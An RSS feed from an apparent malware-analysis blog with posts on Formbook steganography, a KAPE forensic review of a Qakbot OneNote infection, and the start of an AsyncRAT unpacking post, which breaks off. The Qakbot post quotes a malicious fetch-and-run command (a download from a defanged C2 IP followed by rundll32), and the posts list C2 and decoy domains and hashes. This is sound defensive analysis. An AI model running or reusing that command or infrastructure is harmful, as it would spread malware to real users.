<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>malwr0nwind0z</title>
	<atom:link href="/blog/feed/" rel="self" type="application/rss+xml" />
	<link>/blog/</link>
	<description></description>
	<lastBuildDate>Mon, 15 May 2023 13:43:38 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=6.2</generator>

<image>
	<url>/blog/wp-content/uploads/2023/03/cropped-android-chrome-512x512-1-32x32.png</url>
	<title>malwr0nwind0z</title>
	<link>/blog/</link>
	<width>32</width>
	<height>32</height>
</image> 
	<item>
		<title>Stealthy Formbook leverages steganography</title>
		<link>/blog/post_5-15-23_formbook_sample/?utm_source=rss#038;utm_medium=rss&#038;utm_campaign=post_5-15-23_formbook_sample</link>
					<comments>/blog/post_5-15-23_formbook_sample/#respond</comments>
		
		<dc:creator><![CDATA[malwr0nwind0z]]></dc:creator>
		<pubDate>Mon, 15 May 2023 13:07:17 +0000</pubDate>
				<category><![CDATA[Malware Analysis]]></category>
		<category><![CDATA[.NET]]></category>
		<category><![CDATA[bitmap]]></category>
		<category><![CDATA[formbook]]></category>
		<category><![CDATA[malspam]]></category>
		<category><![CDATA[malware]]></category>
		<category><![CDATA[MASM]]></category>
		<category><![CDATA[rar attachment]]></category>
		<category><![CDATA[steganography]]></category>
		<category><![CDATA[xloader]]></category>
		<guid isPermaLink="false">/blog/?p=1135</guid>

					<description><![CDATA[<p>Formbook: A Infostealer Formbook is a type of malware that is primarily used for stealing sensitive information from infected computers, was first discovered in the wild back in 2016. It is commonly distributed via malspam, or malicious spam, which is a type of spam email that contains malware or links to malware-infected websites. In this &#8230;</p>
<p class="read-more"> <a class="" href="/blog/post_5-15-23_formbook_sample/"> <span class="screen-reader-text">Stealthy Formbook leverages steganography</span> Read More &#187;</a></p>
<p>The post <a href="/blog/post_5-15-23_formbook_sample/">Stealthy Formbook leverages steganography</a> first appeared on <a href="/blog/">malwr0nwind0z</a>.</p>]]></description>
										<content:encoded><![CDATA[<p><img decoding="async" src="/blog/wp-content/uploads/2023/05/a-picture-containing-stitch-description-automatic.jpeg" alt="A picture containing stitch Description automatically generated with medium confidence" /></p>
<p>Formbook: A Infostealer</p>
<p>Formbook is a type of malware that is primarily used for stealing sensitive information from infected computers, was first discovered in the wild back in 2016. It is commonly distributed via malspam, or malicious spam, which is a type of spam email that contains malware or links to malware-infected websites. In this report, we will discuss a recent Formbook (version 4.1) infection that occurred via malspam.</p>
<p>How This Formbook Infection Works</p>
<p>In this instance it was delivered through malspam that contained a malicious Microsoft executable within a rar archive named <a id="post-1135-_Hlk134308079"></a>scan copy-001.rar. The malicious Formbook dropper executable (scan copy-001.exe). The email is attempting to social engineer the victim into opening the rar attachment to execute the Formbook malware. The email contained urgent language, asking the victim to confirm that the attachment is a revised proforma invoice (which is an obvious ruse).</p>
<pre><img decoding="async" src="/blog/wp-content/uploads/2023/05/a-picture-containing-text-screenshot-description.png" alt="A picture containing text, screenshot Description automatically generated" />
Figure 1: Formbook malspam containing a malicious rar attachment (scan copy-001.exe)
</pre>
<p>Technical Analysis</p>
<p>We start our analysis with scan copy-001.exe (Formbook dropper). It is a 32-bit, .NET executable file. Upon execution of scan copy-001.exe, persistence is set by creating a scheduled task to run every time the infected user logs on:</p>
<p>Scheduled Task: %WINDIR%system32tasksupdatespwwigddan</p>
<p>C:Users&lt;Username&gt;AppDataRoamingpWWigddan.exe (Classification: Formbook Dropper; renamed duplicate of scan copy-001.exe)</p>
<p><img decoding="async" src="/blog/wp-content/uploads/2023/05/a-screenshot-of-a-computer-description-automatica.jpeg" alt="A screenshot of a computer Description automatically generated with medium confidence" />Figure 2: Creates a Scheduled Task to set persistence.</p>
<p><img decoding="async" src="/blog/wp-content/uploads/2023/05/a-screenshot-of-a-computer-description-automatica-1.jpeg" alt="A screenshot of a computer Description automatically generated with medium confidence" width="705" height="225" /></p>
<p>Figure 3: Drops a executable file that corresponds with the scheduled task.</p>
<p>The Anti-Analysis functionality includes multiple subfunctions to check for the following anti-analysis tools such as (Fig. 4 &amp; 5):</p>
<ul>
<li>DebuggerHidden: explicitly tells the debugger not to step inside of the method and no break point will be hit over that method.</li>
<li>EditorBrowsable: prevents the debugger from displaying code.</li>
<li>DebuggerBrowsableState.Never: hides the element from the debugger.</li>
</ul>
<p><img decoding="async" src="/blog/wp-content/uploads/2023/05/EditorBrowsable_DeuggerHidden.png" alt="" width="1158" height="187" /> Figure 4: EditorBrowserable and DebuggerHidden functions.</p>
<p><img decoding="async" src="/blog/wp-content/uploads/2023/05/a-screenshot-of-a-computer-program-description-au.png" alt="A screenshot of a computer program Description automatically generated with medium confidence" /></p>
<p>Figure 5: DebuggerBrowserableState.Never function.</p>
<p>The Main function decodes the hardcoded base64 encoded module named Bunifu.UI.dll and loads it in the memory using the Invoke method (Figure 6).</p>
<p><img decoding="async" src="/blog/wp-content/uploads/2023/05/a-screenshot-of-a-computer-program-description-au-1.png" alt="A screenshot of a computer program Description automatically generated with medium confidence" /><br />
Figure 6: Scan copy-001.exe loading Bunifu.UI.dll</p>
<p>The new module Bunifu.UI.dll is an obfuscated .NET file that further executes a function to retrieve the embedded bitmap image named otQGDK, which is present in the resource of the malware file scan copy-001.exe.</p>
<p>This steganography technique is used to hide malicious content in the compressed bitmap image. The successful decompression of the bitmap image retrieves another .NET file in memory which is MajorRevision.exe (Figure 8). The Bunifu.UI.dll module then loads MajorRevision.exe using the Assembly.Load method; which passes the decompressed bitmap content as an argument and then invokes it.</p>
<p><img decoding="async" src="/blog/wp-content/uploads/2023/05/a-screen-shot-of-a-computer-description-automatic.png" alt="A screen shot of a computer Description automatically generated with medium confidence" /><br />
Figure 7: Encrypted bitmap image (otQGDKna) hiding an embedded executable (MajorRevsion.exe).</p>
<p><img decoding="async" src="/blog/wp-content/uploads/2023/05/a-screenshot-of-a-computer-program-description-au-2.png" alt="A screenshot of a computer program Description automatically generated with medium confidence" /><br />
Figure 8: Successful decompression of the bitmap image retrieves another .NET file in memory which is MajorRevision.exe.</p>
<p>C2 Configuration Settings</p>
<p>Below are the decrypted hardcoded configuration settings:</p>
<p>{&#8220;C2 list&#8221;: [&#8220;www.despachocontablequinsa.com/m82/&#8221;], &#8220;decoy&#8221;: [&#8220;jamesdevereux.com&#8221;, &#8220;artificialturfminneapolis.com&#8221;, &#8220;hongmeiyan.com&#8221;, &#8220;lojaderoupasbr.com&#8221;, &#8220;yit.africa&#8221;, &#8220;austinrelocationexpert.com&#8221;, &#8220;saiva.page&#8221;, &#8220;exitsategy.com&#8221;, &#8220;chochonux.com&#8221;, &#8220;klosterbraeu-unterliezheim.com&#8221;, &#8220;byseymanur.com&#8221;, &#8220;sblwarwickshire.co.uk&#8221;, &#8220;brazimaid.com&#8221;, &#8220;ciogame.com&#8221;, &#8220;bronzesailing.com&#8221;, &#8220;dwkapl.xyz&#8221;, &#8220;022dyd.com&#8221;, &#8220;compassandpathwriting.com&#8221;, &#8220;alphabet1x.com&#8221;, &#8220;selfcleaninghairbrush.co.uk&#8221;, &#8220;power-bank.co.uk&#8221;, &#8220;kickskaart.com&#8221;, &#8220;baumanbilliardsnv.com&#8221;, &#8220;bestcp.net&#8221;, &#8220;doghospitalnearme.com&#8221;, &#8220;mixano.africa&#8221;, &#8220;helarybaber.online&#8221;, &#8220;illubio.com&#8221;, &#8220;ciutas.com&#8221;, &#8220;ldpr33.ru&#8221;, &#8220;killtheblacks.com&#8221;, &#8220;cassino-portugal.com&#8221;, &#8220;danhaii.com&#8221;, &#8220;gvtowingservice.com&#8221;, &#8220;let-travel.africa&#8221;, &#8220;dental-implants-67128.com&#8221;, &#8220;facetaxi.xyz&#8221;, &#8220;ctjh9u8e.vip&#8221;, &#8220;kyosaiohruri.com&#8221;, &#8220;executivepresencetrainer.com&#8221;, &#8220;greatharmony.africa&#8221;, &#8220;feelingsarereal.com&#8221;, &#8220;devopsuday.club&#8221;, &#8220;happiestminds-udemy.com&#8221;, &#8220;fittingstands.com&#8221;, &#8220;happyhousegarment.com&#8221;, &#8220;24daysofheaven.com&#8221;, &#8220;herhustlenation.com&#8221;, &#8220;xn--oy2b27nt6b.net&#8221;, &#8220;hothotcogixem.online&#8221;, &#8220;hausmeisterservice-berlin.net&#8221;, &#8220;hjddbb.com&#8221;, &#8220;stoutfamilychiro.com&#8221;, &#8220;bookishthoughtsbychristy.com&#8221;, &#8220;gibellinaheartquake.com&#8221;, &#8220;8cf1utrb6.xyz&#8221;, &#8220;patrick-daggitt.com&#8221;, &#8220;ebcbank.net&#8221;, &#8220;angel909reviews.com&#8221;, &#8220;arcteryxsouthafricaonline.com&#8221;, &#8220;cutematvhy.com&#8221;, &#8220;art2z.com&#8221;, &#8220;bulkforeverstamps.com&#8221;, &#8220;heatbling.com&#8221;]}</p>
<p>As with previous versions of Formbook, MajorRevision.exe communicates with multiple domains established as decoys, but it only uses one true C&amp;C.</p>
<p><img decoding="async" src="/blog/wp-content/uploads/2023/05/a-picture-containing-text-screenshot-font-infor.png" alt="A picture containing text, screenshot, font, information Description automatically generated" /><br />
Figure 9: The C2 configuration file.</p>
<p>The final payload is retrieved from memory by converting a large array of bytes, this payload is then injected into a newly created process using Process Hollowing.</p>
<p>The final Formbook payload is not a .NET application but a MASM-compiled PE32 executable composed only of a .text section.</p>
<p><img decoding="async" src="/blog/wp-content/uploads/2023/05/a-screenshot-of-a-computer-program-description-au-3.png" alt="A screenshot of a computer program Description automatically generated with medium confidence" /><br />
Figure 10: Process Hollowing functions utilized to inject the final payload.</p>
<p><img decoding="async" src="/blog/wp-content/uploads/2023/05/a-screenshot-of-a-computer-program-description-au-4.png" alt="A screenshot of a computer program Description automatically generated with medium confidence" /></p>
<p>Figure 11: Final Formbook payload is compiled with MASM.</p>
<p><img decoding="async" src="/blog/wp-content/uploads/2023/05/a-screenshot-of-a-computer-description-automatica.png" alt="A screenshot of a computer Description automatically generated" /></p>
<p>Figure 12: The final Formbook payload only has one section (.text section).</p>
<p>To prevent similar attacks in the future, organizations should implement strong email security measures, including spam filters, email authentication protocols, and user training programs. Users should be taught to recognize the signs of malspam, including suspicious attachments, urgent language, and unexpected emails from unknown senders. Additionally, organizations should use endpoint protection software and regularly update their systems to mitigate the risk of malware infections.</p>
<p>In conclusion, Formbook infections via malspam are a serious threat to organizations and individuals alike. Attackers use social engineering tactics to trick victims into downloading malware, which can lead to significant data breaches and financial losses. Organizations must remain vigilant and implement robust security measures to protect against these types of attacks.</p>
<p>IOCs:</p>
<p>Scan copy-001.exe &#8211; MD5: 97ab2171b12f2e2b41f65c02f23da953</p>
<p>Bunifu.UI.dll &#8211; MD5: 27F5124BF8F451BCA8D8A15C73C4F521</p>
<p>MajorRevision.exe &#8211; MD5: 93b2754b3afa34b828cb071f036a8d31</p>
<p>Formbook_payload.exe (Final payload) &#8211; MD5: E46809BB82201038371C602FA8B68531</p><p>The post <a href="/blog/post_5-15-23_formbook_sample/">Stealthy Formbook leverages steganography</a> first appeared on <a href="/blog/">malwr0nwind0z</a>.</p>]]></content:encoded>
					
					<wfw:commentRss>/blog/post_5-15-23_formbook_sample/feed/</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>KAPE Collection: Forensic artifacts from a Qakbot infection (via Qaknote)</title>
		<link>/blog/post_3-12-23_kape_forensics_qakbot_qaknote/?utm_source=rss#038;utm_medium=rss&#038;utm_campaign=post_3-12-23_kape_forensics_qakbot_qaknote</link>
					<comments>/blog/post_3-12-23_kape_forensics_qakbot_qaknote/#respond</comments>
		
		<dc:creator><![CDATA[malwr0nwind0z]]></dc:creator>
		<pubDate>Sun, 12 Mar 2023 16:34:38 +0000</pubDate>
				<category><![CDATA[Forensic Analysis]]></category>
		<category><![CDATA[banking trojan]]></category>
		<category><![CDATA[dead-box forensics]]></category>
		<category><![CDATA[forensics]]></category>
		<category><![CDATA[KAPE]]></category>
		<category><![CDATA[malware]]></category>
		<category><![CDATA[onenote]]></category>
		<category><![CDATA[Qakbot]]></category>
		<category><![CDATA[Qaknote]]></category>
		<guid isPermaLink="false">/blog/?p=1097</guid>

					<description><![CDATA[<p>KAPE: Kroll Artifact Parser and Extractor KAPE is a open source Windows-based triage program that will find and collect important forensically relevant Windows OS artifacts (System logs, Registry entries, etc.). KAPE can be ran on a live Windows operating or a mounted Windows image (i.e. dead-box forensics). KAPE utilizes Targets and Modules to collect and &#8230;</p>
<p class="read-more"> <a class="" href="/blog/post_3-12-23_kape_forensics_qakbot_qaknote/"> <span class="screen-reader-text">KAPE Collection: Forensic artifacts from a Qakbot infection (via Qaknote)</span> Read More &#187;</a></p>
<p>The post <a href="/blog/post_3-12-23_kape_forensics_qakbot_qaknote/">KAPE Collection: Forensic artifacts from a Qakbot infection (via Qaknote)</a> first appeared on <a href="/blog/">malwr0nwind0z</a>.</p>]]></description>
										<content:encoded><![CDATA[<div data-elementor-type="wp-post" data-elementor-id="1097" class="elementor elementor-1097">
									<section class="elementor-section elementor-top-section elementor-element elementor-element-1ed9132 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="1ed9132" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-444806b5" data-id="444806b5" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-77a142ff elementor-widget elementor-widget-text-editor" data-id="77a142ff" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
			<style>/*! elementor - v3.13.2 - 11-05-2023 */
.elementor-widget-text-editor.elementor-drop-cap-view-stacked .elementor-drop-cap{background-color:#69727d;color:#fff}.elementor-widget-text-editor.elementor-drop-cap-view-framed .elementor-drop-cap{color:#69727d;border:3px solid;background-color:transparent}.elementor-widget-text-editor:not(.elementor-drop-cap-view-default) .elementor-drop-cap{margin-top:8px}.elementor-widget-text-editor:not(.elementor-drop-cap-view-default) .elementor-drop-cap-letter{width:1em;height:1em}.elementor-widget-text-editor .elementor-drop-cap{float:left;text-align:center;line-height:1;font-size:50px}.elementor-widget-text-editor .elementor-drop-cap-letter{display:inline-block}</style>				<p><img decoding="async" width="545" height="297" class="wp-image-1098" src="/blog/wp-content/uploads/2023/03/icon-description-automatically-generated.png" alt="Icon Description automatically generated" srcset="/blog/wp-content/uploads/2023/03/icon-description-automatically-generated.png 545w, /blog/wp-content/uploads/2023/03/icon-description-automatically-generated-300x163.png 300w" sizes="(max-width: 545px) 100vw, 545px" /></p>
<p>KAPE: <strong>K</strong>roll <strong>A</strong>rtifact <strong>P</strong>arser and <strong>E</strong>xtractor</p>
<p>KAPE is a open source Windows-based triage program that will find and collect important forensically relevant Windows OS artifacts (System logs, Registry entries, etc.). KAPE can be ran on a live Windows operating or a mounted Windows image (i.e. dead-box forensics). KAPE utilizes Targets and Modules to collect and triage forensic artifacts.</p>
<p>How KAPE Works</p>
<p>KAPE utilizes Targets and Modules to collect and triage forensic artifacts. The concepts of Targets and Modules allow this tool to do its work:</p>
<p>Targets: the type of artifacts (files, logs, or registry hives) that you can collect and store in a container (i.e. vhdx, zip).</p>
<p>Modules: scripts that utilize third-party programs/parsers to process and export (i.e. .csv, zip) the artifacts.</p>
<p>Below, we run KAPE to collect forensic artifacts on a Windows 10 machine suspected of being infected with Qakbot. The KAPE collection is being saved to an external HDD (D:).</p>
<p><img decoding="async" width="1088" height="125" class="wp-image-1099" src="/blog/wp-content/uploads/2023/03/word-image-1097-2.png" srcset="/blog/wp-content/uploads/2023/03/word-image-1097-2.png 1088w, /blog/wp-content/uploads/2023/03/word-image-1097-2-300x34.png 300w, /blog/wp-content/uploads/2023/03/word-image-1097-2-1024x118.png 1024w, /blog/wp-content/uploads/2023/03/word-image-1097-2-768x88.png 768w" sizes="(max-width: 1088px) 100vw, 1088px" /> <br><strong>Figure 1: KAPE ran from an external drive.</strong></p>
<p><img decoding="async" width="702" height="245" class="wp-image-1100" src="/blog/wp-content/uploads/2023/03/text-description-automatically-generated.png" alt="Text Description automatically generated" srcset="/blog/wp-content/uploads/2023/03/text-description-automatically-generated.png 702w, /blog/wp-content/uploads/2023/03/text-description-automatically-generated-300x105.png 300w" sizes="(max-width: 702px) 100vw, 702px" /><br><strong>Figure 2: KAPE collection is done.</strong></p>
<p>The target forensic artifacts (files, logs, or registry hives) that I collect are stored in a vhdx container where I can later mount and analyze.</p>
<p><img decoding="async" width="800" height="108" class="wp-image-1101" src="/blog/wp-content/uploads/2023/03/word-image-1097-4.jpeg" srcset="/blog/wp-content/uploads/2023/03/word-image-1097-4.jpeg 800w, /blog/wp-content/uploads/2023/03/word-image-1097-4-300x41.jpeg 300w, /blog/wp-content/uploads/2023/03/word-image-1097-4-768x104.jpeg 768w" sizes="(max-width: 800px) 100vw, 800px" /></p><p><strong>Figure 3: Target forensic artifacts stored in a xhdx file.</strong></p>
<p><img decoding="async" width="1177" height="362" class="wp-image-1102" src="/blog/wp-content/uploads/2023/03/graphical-user-interface-text-application-email.jpeg" alt="Graphical user interface, text, application, email Description automatically generated" srcset="/blog/wp-content/uploads/2023/03/graphical-user-interface-text-application-email.jpeg 1177w, /blog/wp-content/uploads/2023/03/graphical-user-interface-text-application-email-300x92.jpeg 300w, /blog/wp-content/uploads/2023/03/graphical-user-interface-text-application-email-1024x315.jpeg 1024w, /blog/wp-content/uploads/2023/03/graphical-user-interface-text-application-email-768x236.jpeg 768w" sizes="(max-width: 1177px) 100vw, 1177px" /><strong>Figure 4: The xhdx file is mounted for analysis.</strong></p>
<p><img decoding="async" width="1431" height="482" class="wp-image-1103" src="/blog/wp-content/uploads/2023/03/graphical-user-interface-application-table-exce.jpeg" alt="Graphical user interface, application, table, Excel Description automatically generated" srcset="/blog/wp-content/uploads/2023/03/graphical-user-interface-application-table-exce.jpeg 1431w, /blog/wp-content/uploads/2023/03/graphical-user-interface-application-table-exce-300x101.jpeg 300w, /blog/wp-content/uploads/2023/03/graphical-user-interface-application-table-exce-1024x345.jpeg 1024w, /blog/wp-content/uploads/2023/03/graphical-user-interface-application-table-exce-768x259.jpeg 768w" sizes="(max-width: 1431px) 100vw, 1431px" /><strong>Figure 5: The CopyLog of all of the files that were collected in the xhdx file.</strong></p>
<p>Qakbot: A Banking Trojan</p>
<p>Qakbot is a malicious Banking Trojan that has been actively used in cyberattacks since 2009. This malware is designed to compromise the security of a target system and allow remote attackers to gain unauthorized access and control. Once it infects a computer, it then steals sensitive information such as banking credentials, personal information, and email passwords.</p>
<p>How This Qakbot Infection Started</p>
<p>Qakbot is typically delivered to the victim through various methods, including phishing emails, malspam, exploit kits, and exploiting vulnerabilities in software. The exact method of delivery may vary depending on the attackers&#8217; goals.</p>
<p>In this instance, our digital forensic artifacts confirm that it was delivered through malspam; that contained a malicious Microsoft OneNote document (Qaknote) within a zip archive named Invoice #030223.zip. The malicious OneNote document (Invoice #030223.one) contained a social engineering Microsoft O365 themed image (double click “open”), that once clicked, it executes an embedded WScript file (O P E N .wsf).</p>
<p><img decoding="async" width="1278" height="475" class="wp-image-1104" src="/blog/wp-content/uploads/2023/03/graphical-user-interface-application-description.png" alt="Graphical user interface, application Description automatically generated" srcset="/blog/wp-content/uploads/2023/03/graphical-user-interface-application-description.png 1278w, /blog/wp-content/uploads/2023/03/graphical-user-interface-application-description-300x112.png 300w, /blog/wp-content/uploads/2023/03/graphical-user-interface-application-description-1024x381.png 1024w, /blog/wp-content/uploads/2023/03/graphical-user-interface-application-description-768x285.png 768w" sizes="(max-width: 1278px) 100vw, 1278px" /> <br><strong>Figure 6: Embedded social engineering Microsoft O365 themed image (double click “open”)in the OneNote document (Invoice #030223.one).</strong></p>
<p>Qakbot &#8211; Forensic Artifacts</p>
<p>The review of the user’s Recent folder shows a lnk file for O P E N .wsf, indicating that it was double clicked and executed. Microsoft Protection (MPLog) was able to log the execution of this WScript file (O P E N .wsf) as having PID:7636 and the process start time: 133225496244686642 (LDAP/FILETIME) which converts to Sunday, March 5, 2023 11:13:44 PM GMT-05:00.</p>
<p><img decoding="async" width="1007" height="103" class="wp-image-1105" src="/blog/wp-content/uploads/2023/03/word-image-1097-8.jpeg" srcset="/blog/wp-content/uploads/2023/03/word-image-1097-8.jpeg 1007w, /blog/wp-content/uploads/2023/03/word-image-1097-8-300x31.jpeg 300w, /blog/wp-content/uploads/2023/03/word-image-1097-8-768x79.jpeg 768w" sizes="(max-width: 1007px) 100vw, 1007px" /><strong>Figure 7: Lnk file (located in Recent folder) pointing to the WScript file (O P E N .wsf) that the user executed.</strong></p>
<p><strong><img decoding="async" class="alignnone size-full wp-image-1121" src="/blog/wp-content/uploads/2023/03/Windows_Defender_log_pid_start_wsf.jpg" alt="" width="440" height="18" srcset="/blog/wp-content/uploads/2023/03/Windows_Defender_log_pid_start_wsf.jpg 440w, /blog/wp-content/uploads/2023/03/Windows_Defender_log_pid_start_wsf-300x12.jpg 300w" sizes="(max-width: 440px) 100vw, 440px" />&nbsp;</strong></p><p><strong>Figure 8: Microsoft Protection logging the PID and execution time of the WScript file (O P E N .wsf).</strong></p>
<p>The WScript file invokes PowerShell to download a malicious Qakbot .dll from the following URL:</p>
<p>Download URL: http://143.198.63[.]241/MCv/020 -O $env:TEMP\; rundll32 $env:TEMP\\dysphemistic.dll,RS32;</p>
<p>Drop folder location: C:\Users\&lt;Username&gt;\AppData\Local\Temp\dysphemistic.dll (Classification: Qakbot .dll)</p>
<p>This PowerShell activity was decoded and logged in the Microsoft-Windows-PowerShell%4Operational Event logs (Note: this logging is disabled by default).</p>
<p><img decoding="async" width="1065" height="924" class="wp-image-1107" src="/blog/wp-content/uploads/2023/03/table-description-automatically-generated.jpeg" alt="Table Description automatically generated" srcset="/blog/wp-content/uploads/2023/03/table-description-automatically-generated.jpeg 1065w, /blog/wp-content/uploads/2023/03/table-description-automatically-generated-300x260.jpeg 300w, /blog/wp-content/uploads/2023/03/table-description-automatically-generated-1024x888.jpeg 1024w, /blog/wp-content/uploads/2023/03/table-description-automatically-generated-768x666.jpeg 768w" sizes="(max-width: 1065px) 100vw, 1065px" /><strong>Figure 9: PowerShell Event log showing the download of dysphemistic.dll.</strong></p>
<p>Microsoft Protection (MPLog) Telemetry was able to log the execution of dysphemistic.dll.</p>
<p><img decoding="async" width="1917" height="541" class="wp-image-1108" src="/blog/wp-content/uploads/2023/03/graphical-user-interface-text-application-descr.jpeg" alt="Graphical user interface, text, application Description automatically generated" srcset="/blog/wp-content/uploads/2023/03/graphical-user-interface-text-application-descr.jpeg 1917w, /blog/wp-content/uploads/2023/03/graphical-user-interface-text-application-descr-300x85.jpeg 300w, /blog/wp-content/uploads/2023/03/graphical-user-interface-text-application-descr-1024x289.jpeg 1024w, /blog/wp-content/uploads/2023/03/graphical-user-interface-text-application-descr-768x217.jpeg 768w, /blog/wp-content/uploads/2023/03/graphical-user-interface-text-application-descr-1536x433.jpeg 1536w" sizes="(max-width: 1917px) 100vw, 1917px" /><strong>Figure 10: Microsoft Protection logging the execution of dysphemistic.dll.</strong></p>
<p>Last but not least, we had to perform some Registry Forensics, due to having encoded PowerShell stores in HKCU\SOFTWARE\ subkeys ‘Meteors’ &amp; ‘disprofitablePlanographically’.</p>
<p><img decoding="async" width="1920" height="412" class="wp-image-1109" src="/blog/wp-content/uploads/2023/03/graphical-user-interface-application-description-1.png" alt="Graphical user interface, application Description automatically generated" srcset="/blog/wp-content/uploads/2023/03/graphical-user-interface-application-description-1.png 1920w, /blog/wp-content/uploads/2023/03/graphical-user-interface-application-description-1-300x64.png 300w, /blog/wp-content/uploads/2023/03/graphical-user-interface-application-description-1-1024x220.png 1024w, /blog/wp-content/uploads/2023/03/graphical-user-interface-application-description-1-768x165.png 768w, /blog/wp-content/uploads/2023/03/graphical-user-interface-application-description-1-1536x330.png 1536w" sizes="(max-width: 1920px) 100vw, 1920px" /><strong>Figure 11: Encoded PowerShell stored in HKCU\SOFTWARE\Meteors.</strong></p>
<p><img decoding="async" width="1920" height="315" class="wp-image-1110" src="/blog/wp-content/uploads/2023/03/graphical-user-interface-application-description-2.png" alt="Graphical user interface, application Description automatically generated" srcset="/blog/wp-content/uploads/2023/03/graphical-user-interface-application-description-2.png 1920w, /blog/wp-content/uploads/2023/03/graphical-user-interface-application-description-2-300x49.png 300w, /blog/wp-content/uploads/2023/03/graphical-user-interface-application-description-2-1024x168.png 1024w, /blog/wp-content/uploads/2023/03/graphical-user-interface-application-description-2-768x126.png 768w, /blog/wp-content/uploads/2023/03/graphical-user-interface-application-description-2-1536x252.png 1536w" sizes="(max-width: 1920px) 100vw, 1920px" /><strong>Figure 12: Encoded PowerShell stored in HKCU\SOFTWARE\<a id="post-1097-_Hlk129460078"></a>disprofitablePlanographically.</strong></p>
<p>That ends this blog, where we used KAPE to collect and analyzed forensic artifacts from stage 1 of this Qakbot infection.</p>
<p>IOCs:</p>
<p>Invoice #030223.zip (MD5: abc43976c90a3bfef20f08f3632e7c22)</p>
<p>Invoice #030223.one (MD5: 5E0085D44B2CD845CC8A964DAB23027A)</p>
<p>O P E N .wsf (MD5: 56E1C721F50A8AAE1FBAF1459A1208E2)</p>
<p>dysphemistic.dll (MD5: 0AB80C49FDEA4229C022F43F5357E64B)</p>
<p>C2 IOC:</p>
<p>http://143.198.63[.]241/MCv/020</p><p><br></p>						</div>
				</div>
					</div>
		</div>
							</div>
		</section>
							</div><p>The post <a href="/blog/post_3-12-23_kape_forensics_qakbot_qaknote/">KAPE Collection: Forensic artifacts from a Qakbot infection (via Qaknote)</a> first appeared on <a href="/blog/">malwr0nwind0z</a>.</p>]]></content:encoded>
					
					<wfw:commentRss>/blog/post_3-12-23_kape_forensics_qakbot_qaknote/feed/</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>ASyncRAT delivered through malspam via OneNote attachment (Stage 2)</title>
		<link>/blog/post_1-23-23_asyncrat_sample_part_2/?utm_source=rss#038;utm_medium=rss&#038;utm_campaign=post_1-23-23_asyncrat_sample_part_2</link>
					<comments>/blog/post_1-23-23_asyncrat_sample_part_2/#respond</comments>
		
		<dc:creator><![CDATA[malwr0nwind0z]]></dc:creator>
		<pubDate>Mon, 23 Jan 2023 10:38:53 +0000</pubDate>
				<category><![CDATA[Malware Analysis]]></category>
		<category><![CDATA[asyncrat]]></category>
		<category><![CDATA[malware]]></category>
		<category><![CDATA[onenote malware]]></category>
		<category><![CDATA[rat]]></category>
		<guid isPermaLink="false">http://malwr0nwind0z.local/ut-enim-ad-minim-veniam-quis-nostrud-exercitation-ullamco-laboris-nisi/</guid>

					<description><![CDATA[<p>Continuing our previous AsyncRAT discussion, this is Part 2 of this blog post, where I will review stage 2, which will cover the analysis of the ASyncRAT payload (payload.exe) and we will dive into some of its functionalities. Figure 1: File property details of payload.exe shown in CFF Explorer. Unpacking ASyncRAT Since this is a &#8230;</p>
<p class="read-more"> <a class="" href="/blog/post_1-23-23_asyncrat_sample_part_2/"> <span class="screen-reader-text">ASyncRAT delivered through malspam via OneNote attachment (Stage 2)</span> Read More &#187;</a></p>
<p>The post <a href="/blog/post_1-23-23_asyncrat_sample_part_2/">ASyncRAT delivered through malspam via OneNote attachment (Stage 2)</a> first appeared on <a href="/blog/">malwr0nwind0z</a>.</p>]]></description>
										<content:encoded><![CDATA[<p>Continuing our previous AsyncRAT discussion, this is Part 2 of this blog post, where I will review stage 2, which will cover the analysis of the ASyncRAT payload (payload.exe) and we will dive into some of its functionalities.</p>
<p style="text-align: center;"><img decoding="async" class="aligncenter" src="/blog/wp-content/uploads/2023/01/table-description-automatically-generated-2.png" alt="Table Description automatically generated" /><strong> Figure 1: File property details of payload.exe shown in CFF Explorer.</strong></p>
<p>Unpacking ASyncRAT</p>
<p>Since this is a .NET Assembly executable, I used DnSpy to start debugging it, to try and determine what are some of this file’s functionalities. After analyzing and decrypting the encoded (Base64 + AES Encryption (Key, IV)) 1st function (Fig. 2), this malware utilizes some of the following Anti-analysis Techniques:</p>
<p>Calls <em>CheckRemoteDebuggerPresent</em> which checks if a debugger (in a different process on the same machine) is attached to the current process.</p>
<p>Calls <em>IsDebuggerPresent</em> which checks whether the current process is being debugged by a user-mode debugger.</p>
<p>Calls <em>AmsiScanBuffer </em>to attempt to bypass AMSI (Antimalware Scan Interface).</p>
<p style="text-align: center;"><img decoding="async" src="/blog/wp-content/uploads/2023/01/a-screenshot-of-a-computer-description-automatica-2.png" alt="A screenshot of a computer Description automatically generated with medium confidence" /> <strong>Figure 2: The first function of payload.exe while loaded into DnSpy.<br />
</strong></p>
<p style="text-align: center;"><img decoding="async" src="/blog/wp-content/uploads/2023/01/graphical-user-interface-text-application-email-1.png" alt="Graphical user interface, text, application, email Description automatically generated" /> <strong>Figure 3: De-obfuscating the first function using CyberChef, reveals strings of Anti-analysis API calls.</strong></p>
<p>Looking at all of the obfuscation within each of these functions, I came to the conclusion, that I was looking at a packed file.</p>
<p>My next step was to look for the file’s unpacking routine, which brought me to the object named memoryStream2 which is from the MemoryStream Class where it receives decompressed bytes from object GzipStream. These bytes were copied to _buffer. After my breakpoint is hit at “return memoryStream2.ToArray()”. I was able to dump the contents of _buffer, the dumped binary is an executable (File header: MZ). (Fig. 4 &amp; 5)</p>
